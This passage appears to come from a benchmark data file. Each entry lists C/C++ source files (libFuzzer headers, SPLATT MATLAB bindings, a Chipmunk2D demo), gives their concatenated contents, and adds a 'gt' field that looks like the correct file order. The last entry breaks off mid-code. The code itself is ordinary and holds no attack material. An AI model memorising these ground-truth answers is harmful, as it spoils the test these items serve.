            "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerUtil.h'",
            "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerBuiltins.h'"
        ],
        "content": "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerMutate.h'\n:\n\n\n\n\n\n\n\n\n\n#ifndef LLVM_FUZZER_MUTATE_H\n#define LLVM_FUZZER_MUTATE_H\n\n#include \"FuzzerDefs.h\"\n#include \"FuzzerDictionary.h\"\n#include \"FuzzerOptions.h\"\n#include \"FuzzerRandom.h\"\n\nnamespace fuzzer {\n\nclass MutationDispatcher {\npublic:\n  MutationDispatcher(Random &Rand, const FuzzingOptions &Options);\n  ~MutationDispatcher() {}\n\n  void StartMutationSequence();\n\n  void PrintMutationSequence();\n\n  void RecordSuccessfulMutationSequence();\n\n  size_t Mutate_Custom(uint8_t *Data, size_t Size, size_t MaxSize);\n\n  size_t Mutate_CustomCrossOver(uint8_t *Data, size_t Size, size_t MaxSize);\n\n  size_t Mutate_ShuffleBytes(uint8_t *Data, size_t Size, size_t MaxSize);\n\n  size_t Mutate_EraseBytes(uint8_t *Data, size_t Size, size_t MaxSize);\n\n  size_t Mutate_InsertByte(uint8_t *Data, size_t Size, size_t MaxSize);\n\n  size_t Mutate_InsertRepeatedBytes(uint8_t *Data, size_t Size, size_t MaxSize);\n\n  size_t Mutate_ChangeByte(uint8_t *Data, size_t Size, size_t MaxSize);\n\n  size_t Mutate_ChangeBit(uint8_t *Data, size_t Size, size_t MaxSize);\n\n  size_t Mutate_CopyPart(uint8_t *Data, size_t Size, size_t MaxSize);\n\n\n  size_t Mutate_AddWordFromManualDictionary(uint8_t *Data, size_t Size,\n                                            size_t MaxSize);\n\n\n  size_t Mutate_AddWordFromTORC(uint8_t *Data, size_t Size, size_t MaxSize);\n\n\n  size_t Mutate_AddWordFromPersistentAutoDictionary(uint8_t *Data, size_t Size,\n                                                    size_t MaxSize);\n\n\n  size_t Mutate_ChangeASCIIInteger(uint8_t *Data, size_t Size, size_t MaxSize);\n\n  size_t Mutate_ChangeBinaryInteger(uint8_t *Data, size_t Size, size_t MaxSize);\n\n\n  size_t Mutate_CrossOver(uint8_t *Data, size_t Size, size_t MaxSize);\n\n\n\n  size_t Mutate(uint8_t *Data, size_t Size, size_t MaxSize);\n\n\n\n\n  size_t MutateWithMask(uint8_t *Data, size_t Size, size_t MaxSize,\n                        const Vector<uint8_t> &Mask);\n\n\n\n  size_t DefaultMutate(uint8_t *Data, size_t Size, size_t MaxSize);\n\n\n  size_t CrossOver(const uint8_t *Data1, size_t Size1, const uint8_t *Data2,\n                   size_t Size2, uint8_t *Out, size_t MaxOutSize);\n\n  void AddWordToManualDictionary(const Word &W);\n\n  void PrintRecommendedDictionary();\n\n  void SetCrossOverWith(const Unit *U) { CrossOverWith = U; }\n\n  Random &GetRand() { return Rand; }\n\n private:\n  struct Mutator {\n    size_t (MutationDispatcher::*Fn)(uint8_t *Data, size_t Size, size_t Max);\n    const char *Name;\n  };\n\n  size_t AddWordFromDictionary(Dictionary &D, uint8_t *Data, size_t Size,\n                               size_t MaxSize);\n  size_t MutateImpl(uint8_t *Data, size_t Size, size_t MaxSize,\n                    Vector<Mutator> &Mutators);\n\n  size_t InsertPartOf(const uint8_t *From, size_t FromSize, uint8_t *To,\n                      size_t ToSize, size_t MaxToSize);\n  size_t CopyPartOf(const uint8_t *From, size_t FromSize, uint8_t *To,\n                    size_t ToSize);\n  size_t ApplyDictionaryEntry(uint8_t *Data, size_t Size, size_t MaxSize,\n                              DictionaryEntry &DE);\n\n  template <class T>\n  DictionaryEntry MakeDictionaryEntryFromCMP(T Arg1, T Arg2,\n                                             const uint8_t *Data, size_t Size);\n  DictionaryEntry MakeDictionaryEntryFromCMP(const Word &Arg1, const Word &Arg2,\n                                             const uint8_t *Data, size_t Size);\n  DictionaryEntry MakeDictionaryEntryFromCMP(const void *Arg1, const void *Arg2,\n                                             const void *Arg1Mutation,\n                                             const void *Arg2Mutation,\n                                             size_t ArgSize,\n                                             const uint8_t *Data, size_t Size);\n\n  Random &Rand;\n  const FuzzingOptions Options;\n\n\n  Dictionary ManualDictionary;\n\n\n  Dictionary TempAutoDictionary;\n\n\n  Dictionary PersistentAutoDictionary;\n\n  Vector<DictionaryEntry *> CurrentDictionaryEntrySequence;\n\n  static const size_t kCmpDictionaryEntriesDequeSize = 16;\n  DictionaryEntry CmpDictionaryEntriesDeque[kCmpDictionaryEntriesDequeSize];\n  size_t CmpDictionaryEntriesDequeIdx = 0;\n\n  const Unit *CrossOverWith = nullptr;\n  Vector<uint8_t> MutateInPlaceHere;\n  Vector<uint8_t> MutateWithMaskTemp;\n\n\n  Vector<uint8_t> CustomCrossOverInPlaceHere;\n\n  Vector<Mutator> Mutators;\n  Vector<Mutator> DefaultMutators;\n  Vector<Mutator> CurrentMutatorSequence;\n};\n\n}\n\n#endif\n\n'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerDictionary.h'\n:\n\n\n\n\n\n\n\n\n\n#ifndef LLVM_FUZZER_DICTIONARY_H\n#define LLVM_FUZZER_DICTIONARY_H\n\n#include \"FuzzerDefs.h\"\n#include \"FuzzerIO.h\"\n#include \"FuzzerUtil.h\"\n#include <algorithm>\n#include <limits>\n\nnamespace fuzzer {\n\ntemplate <size_t kMaxSizeT> class FixedWord {\npublic:\n  static const size_t kMaxSize = kMaxSizeT;\n  FixedWord() {}\n  FixedWord(const uint8_t *B, uint8_t S) { Set(B, S); }\n\n  void Set(const uint8_t *B, uint8_t S) {\n    assert(S <= kMaxSize);\n    memcpy(Data, B, S);\n    Size = S;\n  }\n\n  bool operator==(const FixedWord<kMaxSize> &w) const {\n    return Size == w.Size && 0 == memcmp(Data, w.Data, Size);\n  }\n\n  static size_t GetMaxSize() { return kMaxSize; }\n  const uint8_t *data() const { return Data; }\n  uint8_t size() const { return Size; }\n\nprivate:\n  uint8_t Size = 0;\n  uint8_t Data[kMaxSize];\n};\n\ntypedef FixedWord<64> Word;\n\nclass DictionaryEntry {\n public:\n  DictionaryEntry() {}\n  DictionaryEntry(Word W) : W(W) {}\n  DictionaryEntry(Word W, size_t PositionHint) : W(W), PositionHint(PositionHint) {}\n  const Word &GetW() const { return W; }\n\n  bool HasPositionHint() const { return PositionHint != std::numeric_limits<size_t>::max(); }\n  size_t GetPositionHint() const {\n    assert(HasPositionHint());\n    return PositionHint;\n  }\n  void IncUseCount() { UseCount++; }\n  void IncSuccessCount() { SuccessCount++; }\n  size_t GetUseCount() const { return UseCount; }\n  size_t GetSuccessCount() const {return SuccessCount; }\n\n  void Print(const char *PrintAfter = \"\\n\") {\n    PrintASCII(W.data(), W.size());\n    if (HasPositionHint())\n      Printf(\"@%zd\", GetPositionHint());\n    Printf(\"%s\", PrintAfter);\n  }\n\nprivate:\n  Word W;\n  size_t PositionHint = std::numeric_limits<size_t>::max();\n  size_t UseCount = 0;\n  size_t SuccessCount = 0;\n};\n\nclass Dictionary {\n public:\n  static const size_t kMaxDictSize = 1 << 14;\n\n  bool ContainsWord(const Word &W) const {\n    return std::any_of(begin(), end(), [&](const DictionaryEntry &DE) {\n      return DE.GetW() == W;\n    });\n  }\n  const DictionaryEntry *begin() const { return &DE[0]; }\n  const DictionaryEntry *end() const { return begin() + Size; }\n  DictionaryEntry & operator[] (size_t Idx) {\n    assert(Idx < Size);\n    return DE[Idx];\n  }\n  void push_back(DictionaryEntry DE) {\n    if (Size < kMaxDictSize)\n      this->DE[Size++] = DE;\n  }\n  void clear() { Size = 0; }\n  bool empty() const { return Size == 0; }\n  size_t size() const { return Size; }\n\nprivate:\n  DictionaryEntry DE[kMaxDictSize];\n  size_t Size = 0;\n};\n\n\n\n\nbool ParseOneDictionaryEntry(const std::string &Str, Unit *U);\n\n\nbool ParseDictionaryFile(const std::string &Text, Vector<Unit> *Units);\n\n}\n\n#endif\n\n'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerUtil.h'\n:\n\n\n\n\n\n\n\n\n\n#ifndef LLVM_FUZZER_UTIL_H\n#define LLVM_FUZZER_UTIL_H\n\n#include \"FuzzerBuiltins.h\"\n#include \"FuzzerBuiltinsMsvc.h\"\n#include \"FuzzerCommand.h\"\n#include \"FuzzerDefs.h\"\n\nnamespace fuzzer {\n\nvoid PrintHexArray(const Unit &U, const char *PrintAfter = \"\");\n\nvoid PrintHexArray(const uint8_t *Data, size_t Size,\n                   const char *PrintAfter = \"\");\n\nvoid PrintASCII(const uint8_t *Data, size_t Size, const char *PrintAfter = \"\");\n\nvoid PrintASCII(const Unit &U, const char *PrintAfter = \"\");\n\n\n\nbool ToASCII(uint8_t *Data, size_t Size);\n\nbool IsASCII(const Unit &U);\n\nbool IsASCII(const uint8_t *Data, size_t Size);\n\nstd::string Base64(const Unit &U);\n\nvoid PrintPC(const char *SymbolizedFMT, const char *FallbackFMT, uintptr_t PC);\n\nstd::string DescribePC(const char *SymbolizedFMT, uintptr_t PC);\n\nvoid PrintStackTrace();\n\nvoid PrintMemoryProfile();\n\nunsigned NumberOfCpuCores();\n\n\nvoid SetSignalHandler(const FuzzingOptions& Options);\n\nvoid SleepSeconds(int Seconds);\n\nunsigned long GetPid();\n\nsize_t GetPeakRSSMb();\n\nint ExecuteCommand(const Command &Cmd);\n\nFILE *OpenProcessPipe(const char *Command, const char *Mode);\n\nconst void *SearchMemory(const void *haystack, size_t haystacklen,\n                         const void *needle, size_t needlelen);\n\nstd::string CloneArgsWithoutX(const Vector<std::string> &Args,\n                              const char *X1, const char *X2);\n\ninline std::string CloneArgsWithoutX(const Vector<std::string> &Args,\n                                     const char *X) {\n  return CloneArgsWithoutX(Args, X, X);\n}\n\ninline std::pair<std::string, std::string> SplitBefore(std::string X,\n                                                       std::string S) {\n  auto Pos = S.find(X);\n  if (Pos == std::string::npos)\n    return std::make_pair(S, \"\");\n  return std::make_pair(S.substr(0, Pos), S.substr(Pos));\n}\n\nstd::string DisassembleCmd(const std::string &FileName);\n\nstd::string SearchRegexCmd(const std::string &Regex);\n\nsize_t SimpleFastHash(const uint8_t *Data, size_t Size);\n\ninline uint32_t Log(uint32_t X) { return 32 - Clz(X) - 1; }\n\ninline size_t PageSize() { return 4096; }\ninline uint8_t *RoundUpByPage(uint8_t *P) {\n  uintptr_t X = reinterpret_cast<uintptr_t>(P);\n  size_t Mask = PageSize() - 1;\n  X = (X + Mask) & ~Mask;\n  return reinterpret_cast<uint8_t *>(X);\n}\ninline uint8_t *RoundDownByPage(uint8_t *P) {\n  uintptr_t X = reinterpret_cast<uintptr_t>(P);\n  size_t Mask = PageSize() - 1;\n  X = X & ~Mask;\n  return reinterpret_cast<uint8_t *>(X);\n}\n\n}\n\n#endif\n\n'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerBuiltins.h'\n:\n\n\n\n\n\n\n\n\n\n#ifndef LLVM_FUZZER_BUILTINS_H\n#define LLVM_FUZZER_BUILTINS_H\n\n#include \"FuzzerDefs.h\"\n\n#if !LIBFUZZER_MSVC\n#include <cstdint>\n\n#define GET_CALLER_PC() __builtin_return_address(0)\n\nnamespace fuzzer {\n\ninline uint8_t  Bswap(uint8_t x)  { return x; }\ninline uint16_t Bswap(uint16_t x) { return __builtin_bswap16(x); }\ninline uint32_t Bswap(uint32_t x) { return __builtin_bswap32(x); }\ninline uint64_t Bswap(uint64_t x) { return __builtin_bswap64(x); }\n\ninline uint32_t Clzll(unsigned long long X) { return __builtin_clzll(X); }\ninline uint32_t Clz(unsigned long long X) { return __builtin_clz(X); }\ninline int Popcountll(unsigned long long X) { return __builtin_popcountll(X); }\n\n}\n\n#endif\n#endif\n",
        "gt": [
            "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerBuiltins.h'",
            "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerUtil.h'",
            "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerDictionary.h'",
            "'the-art-of-fuzzing/Chapter 2  Static & Dynamic Fuzzing/AFL/dynamic_fuzz/libfuzzer-example/libfuzzer-workshop/libFuzzer/Fuzzer/FuzzerMutate.h'"
        ]
    },
    {
        "files": [
            "'splatt/include/splatt/constants.h'",
            "'splatt/include/splatt.h'",
            "'splatt/matlab/splatt_cpd.c'",
            "'splatt/matlab/splatt_shared.h'"
        ],
        "content": "'splatt/include/splatt/constants.h'\n:\n\n\n\n#ifndef SPLATT_SPLATT_CONSTANTS_H\n#define SPLATT_SPLATT_CONSTANTS_H\n\n#ifndef SPLATT_MAX_NMODES\n#define SPLATT_MAX_NMODES ((splatt_idx_t) 8)\n#endif\n\nstatic double const SPLATT_VAL_OFF = -DBL_MAX;\n\n#endif\n\n'splatt/include/splatt.h'\n:\n\n\n\n#ifndef SPLATT_SPLATT_H\n#define SPLATT_SPLATT_H\n\n\n\n\n\n#ifdef SPLATT_USE_MPI\n#include <mpi.h>\n#endif\n\n\n\n\n\n\n\n#include \"splatt/types.h\"\n#include \"splatt/constants.h\"\n#include \"splatt/structs.h\"\n\n\n\n\n#include \"splatt/api_csf.h\"\n#include \"splatt/api_factorization.h\"\n#include \"splatt/api_kernels.h\"\n#include \"splatt/api_kruskal.h\"\n#include \"splatt/api_mpi.h\"\n#include \"splatt/api_options.h\"\n#include \"splatt/api_version.h\"\n\n#endif\n\n'splatt/matlab/splatt_cpd.c'\n:\n#include \"mex.h\"\n\n#include <stdint.h>\n#include <string.h>\n#include <splatt.h>\n\n#include <stdio.h>\n\n#include \"splatt_shared.h\"\n\n\n\n\n\nvoid mexFunction(\n    int nlhs,\n    mxArray * plhs[],\n    int nrhs,\n    mxArray const * prhs[])\n{\n  splatt_idx_t m;\n  if(nrhs < 2) {\n    mexErrMsgTxt(\"ARG2 must be nfactors\\n\");\n    return;\n  }\n\n  if(sizeof(splatt_val_t) != sizeof(double)) {\n    mexErrMsgTxt(\"SPLATT must be compiled with double-precision floats.\\n\");\n    return;\n  }\n\n  if(sizeof(splatt_idx_t) != sizeof(uint64_t)) {\n    mexErrMsgTxt(\"SPLATT must be compiled with 64-bit ints.\\n\");\n    return;\n  }\n\n  double * cpd_opts = splatt_default_opts();\n\n  if(nrhs > 1 && mxIsStruct(prhs[nrhs-1])) {\n    p_parse_opts(prhs[nrhs-1], cpd_opts);\n  }\n\n\n  splatt_idx_t nmodes;\n  splatt_csf * tt = p_parse_tensor(nrhs, prhs, &nmodes, cpd_opts);\n  if(tt == NULL) {\n    splatt_free_opts(cpd_opts);\n    return;\n  }\n\n  splatt_idx_t const nfactors = (splatt_idx_t) mxGetScalar(prhs[1]);\n\n\n  splatt_kruskal factored;\n  int err = splatt_cpd_als(tt, nfactors, cpd_opts, &factored);\n  if(err != SPLATT_SUCCESS) {\n    mexErrMsgTxt(\"splatt_cpd_als returned error.\\n\");\n    return;\n  }\n\n  p_free_tensor(nrhs, prhs, tt, cpd_opts);\n\n  mxArray * mxLambda = mxCreateDoubleMatrix(nfactors, 1, mxREAL);\n  memcpy(mxGetPr(mxLambda), factored.lambda, nfactors * sizeof(double));\n\n\n  mxArray * matcell = mxCreateCellMatrix(1, nmodes);\n  for(m=0; m < nmodes; ++m) {\n    splatt_idx_t const nrows = factored.dims[m];\n\n    mxArray * curr_mat = mxCreateDoubleMatrix(nrows, nfactors, mxREAL);\n\n\n    double * const mxpr = mxGetPr(curr_mat);\n    double const * const sppr = factored.factors[m];\n    splatt_idx_t i, j;\n    for(j=0; j < nfactors; ++j) {\n      for(i=0; i < nrows; ++i) {\n        mxpr[i + (j*nrows)] = sppr[j + (i*nfactors)];\n      }\n    }\n\n\n    mxSetCell(matcell, m, curr_mat);\n  }\n\n  char const * keys[] = {\"lambda\", \"U\", \"fit\"};\n  mxArray * ret = mxCreateStructMatrix(1, 1, 3, keys);\n  mxSetField(ret, 0, \"lambda\", mxLambda);\n  mxSetField(ret, 0, \"U\", matcell);\n  mxSetField(ret, 0, \"fit\", mxCreateDoubleScalar(factored.fit));\n\n\n  if(nlhs > 0) {\n    plhs[0] = ret;\n  }\n\n\n  splatt_free_kruskal(&factored);\n  splatt_free_opts(cpd_opts);\n}\n\n\n'splatt/matlab/splatt_shared.h'\n:#ifndef SPLATTLAB_SHARED_H\n#define SPLATTLAB_SHARED_H\n\n#include <splatt.h>\n#include <stdio.h>\n\n\n\n\n\n\nstatic uint64_t * p_get_uint64_data(\n    mxArray const * const mxstruct,\n    char const * const field)\n{\n  return (uint64_t *) mxGetData(mxGetField(mxstruct, 0, field));\n}\n\n\nstatic double * p_get_double_data(\n    mxArray const * const mxstruct,\n    char const * const field)\n{\n  return (double *) mxGetData(mxGetField(mxstruct, 0, field));\n}\n\n\n\nstatic int * p_get_int_data(\n    mxArray const * const mxstruct,\n    char const * const field)\n{\n  return (int *) mxGetData(mxGetField(mxstruct, 0, field));\n}\n\n\n\nstatic void p_mk_int32(\n    mxArray * const mxstruct,\n    char const * const field,\n    splatt_idx_t const len,\n    int32_t const * const vals)\n{\n  mxSetField(mxstruct, 0, field,\n      mxCreateNumericMatrix(1, len, mxINT32_CLASS, mxREAL));\n  memcpy(p_get_uint64_data(mxstruct, field), vals, len * sizeof(int32_t));\n}\n\n\n\nstatic void p_mk_uint64(\n    mxArray * const mxstruct,\n    char const * const field,\n    splatt_idx_t const len,\n    splatt_idx_t const * const vals)\n{\n  mxSetField(mxstruct, 0, field,\n      mxCreateNumericMatrix(1, len, mxUINT64_CLASS, mxREAL));\n  memcpy(p_get_uint64_data(mxstruct, field), vals, len * sizeof(uint64_t));\n}\n\n\n\nstatic void p_mk_double(\n    mxArray * const mxstruct,\n    char const * const field,\n    splatt_idx_t const len,\n    splatt_val_t const * const vals)\n{\n  mxSetField(mxstruct, 0, field,\n      mxCreateDoubleMatrix(1, len, mxREAL));\n  memcpy(p_get_uint64_data(mxstruct, field), vals, len * sizeof(double));\n}\n\n\ntypedef struct splatt_option\n{\n  char * name;\n  int has_arg;\n  int opt_id;\n} splattlab_option_t;\n\nstatic splattlab_option_t option_names[] =\n{\n  {\"tol\", 1, SPLATT_OPTION_TOLERANCE},\n  {\"its\", 1, SPLATT_OPTION_NITER},\n  {\"threads\", 1, SPLATT_OPTION_NTHREADS},\n  {\"verbosity\", 1, SPLATT_OPTION_VERBOSITY},\n  {NULL, 0, 0}\n};\n\n\nstatic void p_parse_opts(\n    mxArray const * const opts,\n    double * const cpd_opts)\n{\n  if(!mxIsStruct(opts)) {\n    mexErrMsgTxt(\"SPLATT expects options array to be a structure.\\n\");\n    return;\n  }\n\n  splattlab_option_t * head = option_names;\n  for(; head->name != NULL; ++head) {\n    mxArray * mopt = mxGetField(opts, 0, head->name);\n    if(!mopt) {\n      continue;\n    }\n\n    if(head->has_arg == 1) {\n      cpd_opts[head->opt_id] = (double) mxGetScalar(mopt);\n    } else {\n      cpd_opts[head->opt_id] = 1;\n    }\n  }\n}\n\n\n\n\n\n\nstatic splatt_csf * p_convert_sptensor(\n    mxArray const * const mat_inds,\n    mxArray const * const mat_vals,\n    splatt_idx_t * const nmodes,\n    double const * const cpd_opts)\n{\n  splatt_idx_t m;\n\n\n  mwSize const * dims = mxGetDimensions(mat_inds);\n  splatt_idx_t nnz = dims[0];\n  *nmodes = dims[1];\n\n\n  splatt_val_t * vals = (splatt_val_t *) mxMalloc(nnz * sizeof(splatt_val_t));\n  splatt_idx_t * inds[SPLATT_MAX_NMODES];\n  for(m=0; m < *nmodes; ++m) {\n    inds[m] = (splatt_idx_t *) mxMalloc(nnz * sizeof(splatt_idx_t));\n  }\n\n\n  double const * const mxinds = mxGetPr(mat_inds);\n  double const * const mxvals = mxGetPr(mat_vals);\n\n\n  splatt_idx_t n;\n  for(n=0; n < nnz; ++n) {\n    for(m=0; m < *nmodes; ++m) {\n      inds[m][n] = (splatt_idx_t) mxinds[n + (m*nnz)] - 1;\n    }\n    vals[n] = (splatt_val_t) mxvals[n];\n  }\n\n  splatt_csf * tt;\n  splatt_csf_convert(*nmodes, nnz, inds, vals, &tt, cpd_opts);\n\n  for(m=0; m < *nmodes; ++m) {\n    mxFree(inds[m]);\n  }\n  mxFree(vals);\n\n  return tt;\n}\n\n\n\nstatic splatt_csf * p_unpack_csf_cell(\n    mxArray const * const cell,\n    splatt_idx_t * outnmodes)\n{\n  splatt_idx_t t, i, tile;\n  splatt_csf * csf = NULL;\n  splatt_idx_t ntensors = (splatt_idx_t) mxGetNumberOfElements(cell);\n\n  csf = (splatt_csf *) mxMalloc(ntensors * sizeof(*csf));\n\n  for(t=0; t < ntensors; ++t) {\n    mxArray const * const curr = mxGetCell(cell, t);\n\n    csf[t].nnz = *(p_get_uint64_data(curr, \"nnz\"));\n    csf[t].nmodes = *(p_get_uint64_data(curr, \"nmodes\"));\n\n    splatt_idx_t const nmodes = csf[t].nmodes;\n\n    memcpy(csf[t].dims, p_get_uint64_data(curr, \"dims\"),\n        nmodes * sizeof(uint64_t));\n    memcpy(csf[t].dim_perm, p_get_uint64_data(curr, \"dim_perm\"),\n        nmodes * sizeof(uint64_t));\n    memcpy(csf[t].dim_iperm, p_get_uint64_data(curr, \"dim_iperm\"),\n        nmodes * sizeof(uint64_t));\n    memcpy(&(csf[t].which_tile), p_get_int_data(curr, \"which_tile\"),\n        sizeof(splatt_tile_type));\n    memcpy(&(csf[t].ntiles), p_get_uint64_data(curr, \"ntiles\"),\n        sizeof(uint64_t));\n    memcpy(&(csf[t].ntiled_modes), p_get_uint64_data(curr, \"ntiled_modes\"),\n        nmodes * sizeof(uint64_t));\n    memcpy(csf[t].tile_dims, p_get_uint64_data(curr, \"tile_dims\"),\n        nmodes * sizeof(uint64_t));\n\n\n    csf[t].pt = (csf_sparsity *)mxMalloc(csf[t].ntiles * sizeof(csf_sparsity));\n\n\n    mxArray const * const pts = mxGetField(curr, 0, \"pt\");\n    for(tile=0; tile < csf[t].ntiles; ++tile) {\n      csf_sparsity * pt = csf[t].pt + tile;\n      mxArray const * const curr_tile = mxGetCell(pts, tile);\n\n      memcpy(pt->nfibs, p_get_uint64_data(curr_tile, \"nfibs\"),\n          nmodes * sizeof(uint64_t));\n\n      if(pt->nfibs[nmodes-1] == 0) {\n        pt->vals = NULL;\n\n        splatt_idx_t m;\n        for(m=0; m < nmodes; ++m) {\n          pt->fptr[m] = NULL;\n          pt->fids[m] = NULL;\n        }\n\n        pt->fptr[0] = (splatt_idx_t *) malloc(2 * sizeof(**(pt->fptr)));\n        pt->fptr[0][0] = 0;\n        pt->fptr[0][1] = 0;\n\n        continue;\n      }\n\n      pt->vals = p_get_double_data(curr_tile, \"vals\");\n\n\n      int32_t has_fids[SPLATT_MAX_NMODES];\n      memcpy(has_fids, mxGetData(mxGetField(curr_tile, 0, \"has_fids\")),\n          nmodes * sizeof(int32_t));\n\n\n      mxArray const * const mxfptr = mxGetField(curr_tile, 0, \"fptr\");\n      splatt_idx_t m;\n      for(m=0; m < nmodes-1; ++m) {\n        pt->fptr[m] = mxGetData(mxGetCell(mxfptr, m));\n      }\n\n      mxArray const * const mxfids = mxGetField(curr_tile, 0, \"fids\");\n      for(m=0; m < nmodes; ++m) {\n        if(has_fids[m]) {\n          pt->fids[m] = mxGetData(mxGetCell(mxfids, m));\n        } else {\n          pt->fids[m] = NULL;\n        }\n      }\n    }\n  }\n\n  *outnmodes = csf->nmodes;\n  return csf;\n}\n\n\n\nstatic splatt_csf * p_parse_tensor(\n    int const nargs,\n    mxArray const * const args[],\n    splatt_idx_t * nmodes,\n    double const * const cpd_opts)\n{\n  splatt_csf * tt = NULL;\n  if(nargs < 1) {\n    mexErrMsgTxt(\"Missing arguments. See 'help splatt_load' for usage.\\n\");\n    return NULL;\n  }\n\n  if(mxIsChar(args[0])) {\n    char * fname = (char *) mxArrayToString(args[0]);\n    int err = splatt_csf_load(fname, nmodes, &tt, cpd_opts);\n\n    if(err != SPLATT_SUCCESS) {\n      mexErrMsgIdAndTxt(\"SPLATT:FileNotFound\",\n                        \"Could not load file '%s'.\\n\", fname);\n    }\n    mxFree(fname);\n  } else if(nargs > 1 && mxIsNumeric(args[0]) && mxIsNumeric(args[1])) {\n    tt = p_convert_sptensor(args[0], args[1], nmodes, cpd_opts);\n  } else if(mxIsCell(args[0])) {\n    tt = p_unpack_csf_cell(args[0], nmodes);\n  } else {\n    mexErrMsgTxt(\"Invalid tensor format. See 'help splatt_load' for usage.\\n\");\n    return NULL;\n  }\n\n  return tt;\n}\n\n\n\nstatic void p_free_tensor(\n    int const nargs,\n    mxArray const * const args[],\n    splatt_csf * tt,\n    double const * const splatt_opts)\n{\n  if(mxIsChar(args[0])) {\n    splatt_free_csf(tt, splatt_opts);\n  } else if(nargs > 1 && mxIsNumeric(args[0]) && mxIsNumeric(args[1])) {\n    splatt_free_csf(tt, splatt_opts);\n  } else if(mxIsCell(args[0])) {\n\n  } else {\n    mexErrMsgTxt(\"Invalid tensor format. See 'help splatt_load' for usage.\\n\");\n  }\n}\n\n\n#endif\n",
        "gt": [
            "'splatt/include/splatt/constants.h'",
            "'splatt/include/splatt.h'",
            "'splatt/matlab/splatt_shared.h'",
            "'splatt/matlab/splatt_cpd.c'"
        ]
    },
    {
        "files": [
            "'Chipmunk2D/demo/Shatter.c'",
            "'Chipmunk2D/include/chipmunk/cpPivotJoint.h'",
            "'Chipmunk2D/include/chipmunk/cpConstraint.h'",
            "'Chipmunk2D/include/chipmunk/chipmunk.h'"
        ],
        "content": "'Chipmunk2D/demo/Shatter.c'\n:\n\n#include <string.h>\n\n#include \"chipmunk/chipmunk.h\"\n\n#include \"ChipmunkDemo.h\"\n\n#define DENSITY (1.0/10000.0)\n\n#define MAX_VERTEXES_PER_VORONOI 16\n\nstruct WorleyContex {\n\tuint32_t seed;\n\tcpFloat cellSize;\n\tint width, height;\n\tcpBB bb;\n\tcpVect focus;\n};\n\nstatic inline cpVect\nHashVect(uint32_t x, uint32_t y, uint32_t seed)\n{\n\n\tcpFloat border = 0.05f;\n\tuint32_t h = (x*1640531513 ^ y*2654435789) + seed;\n\n\treturn cpv(\n\t\tcpflerp(border, 1.0f - border, (cpFloat)(      h & 0xFFFF)/(cpFloat)0xFFFF),\n\t\tcpflerp(border, 1.0f - border, (cpFloat)((h>>16) & 0xFFFF)/(cpFloat)0xFFFF)\n\t);\n}\n\nstatic cpVect\nWorleyPoint(int i, int j, struct WorleyContex *context)\n{\n\tcpFloat size = context->cellSize;\n\tint width = context->width;\n\tint height = context->height;\n\tcpBB bb = context->bb;\n\n\n\tcpVect fv = HashVect(i, j, context->seed);\n\n\treturn cpv(\n\t\tcpflerp(bb.l, bb.r, 0.5f) + size*(i + fv.x -  width*0.5f),\n\t\tcpflerp(bb.b, bb.t, 0.5f) + size*(j + fv.y - height*0.5f)\n\t);\n}\n\nstatic int\nClipCell(cpShape *shape, cpVect center, int i, int j, struct WorleyContex *context, cpVect *verts, cpVect *clipped, int count)\n{\n\tcpVect other = WorleyPoint(i, j, context);\n\n\tif(cpShapePointQuery(shape, other, NULL) > 0.0f){\n\n\t\tmemcpy(clipped, verts, count*sizeof(cpVect));\n\t\treturn count;\n\t} else {\n\n\t}\n\n\tcpVect n = cpvsub(other, center);\n\tcpFloat dist = cpvdot(n, cpvlerp(center, other, 0.5f));\n\n\tint clipped_count = 0;\n\tfor(int j=0, i=count-1; j<count; i=j, j++){\n\t\tcpVect a = verts[i];\n\t\tcpFloat a_dist = cpvdot(a, n) - dist;\n\n\t\tif(a_dist <= 0.0){\n\t\t\tclipped[clipped_count] = a;\n\t\t\tclipped_count++;\n\t\t}\n\n\t\tcpVect b = verts[j];\n\t\tcpFloat b_dist = cpvdot(b, n) - dist;\n\n\t\tif(a_dist*b_dist < 0.0f){\n\t\t\tcpFloat t = cpfabs(a_dist)/(cpfabs(a_dist) + cpfabs(b_dist));\n\n\t\t\tclipped[clipped_count] = cpvlerp(a, b, t);\n\t\t\tclipped_count++;\n\t\t}\n\t}\n\n\treturn clipped_count;\n}\n\nstatic void\nShatterCell(cpSpace *space, cpShape *shape, cpVect cell, int cell_i, int cell_j, struct WorleyContex *context)\n{\n\n\n\tcpBody *body = cpShapeGetBody(shape);\n\n\tcpVect *ping = (cpVect *)alloca(MAX_VERTEXES_PER_VORONOI*sizeof(cpVect));\n\tcpVect *pong = (cpVect *)alloca(MAX_VERTEXES_PER_VORONOI*sizeof(cpVect));\n\n\tint count = cpPolyShapeGetCount(shape);\n\tcount = (count > MAX_VERTEXES_PER_VORONOI ? MAX_VERTEXES_PER_VORONOI : count);\n\n\tfor(int i=0; i<count; i++){\n\t\tping[i] = cpBodyLocalToWorld(body, cpPolyShapeGetVert(shape, i));\n\t}\n\n\tfor(int i=0; i<context->width; i++){\n\t\tfor(int j=0; j<context->height; j++){\n\t\t\tif(\n\t\t\t\t!(i == 